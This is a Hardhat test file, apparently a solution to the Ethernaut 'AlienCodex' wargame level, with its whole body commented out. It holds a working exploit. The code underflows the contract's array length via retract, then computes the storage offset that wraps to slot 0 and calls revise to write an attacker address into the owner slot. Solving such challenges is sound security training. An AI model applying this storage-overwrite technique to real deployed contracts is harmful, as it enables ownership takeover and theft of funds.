import { ethers } from 'hardhat'
import { AlienCodex } from '../types/typechain/AlienCodex'

describe('Preservation', () => {
  let target: AlienCodex

  let deployer: any, owner: any, attacker: any

  // beforeEach(async () => {
  //   ;[deployer, owner, attacker] = await ethers.getSigners()

  //   const fac = await ethers.getContractFactory('AlienCodex', deployer)

  //   target = (await fac.deploy()) as AlienCodex
  // })

  // it('executes exploit', async () => {
  //   const logAll = async () => {
  //     for (let i = 0; i < 5; i++) {
  //       console.log(
  //         i,
  //         ' ',
  //         await ethers.provider.getStorageAt(target.address, i)
  //       )
  //     }
  //     console.log('\n')
  //   }

  //   await logAll()

  //   await target.make_contact()
  //   await target.retract() //set length to max 0xfff..ff by underflow

  //   const dataLocation = ethers.utils.keccak256(
  //     '0x0000000000000000000000000000000000000000000000000000000000000001'
  //   )

  //   const locationAsBN = ethers.BigNumber.from(dataLocation)
  //   const maxStorage = ethers.BigNumber.from(
  //     '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' //2**256, highest storage location address
  //   )
  //   const diffToOverflow = maxStorage.sub(locationAsBN).add(1)

  //   console.log('maxStorage', maxStorage)
  //   console.log('Diff', diffToOverflow)

  //   await target.revise(
  //     diffToOverflow,
  //     '0x00000000000000000000000021db76B75db2f5d4f9505Eae7d8cE53eB9AEd2B5' //insert attacker address
  //   )

  //   console.log(
  //     '#Array \n',
  //     dataLocation,
  //     '\n',
  //     await ethers.provider.getStorageAt(target.address, dataLocation),
  //     '\n'
  //   )

  //   await logAll()
  // })
})
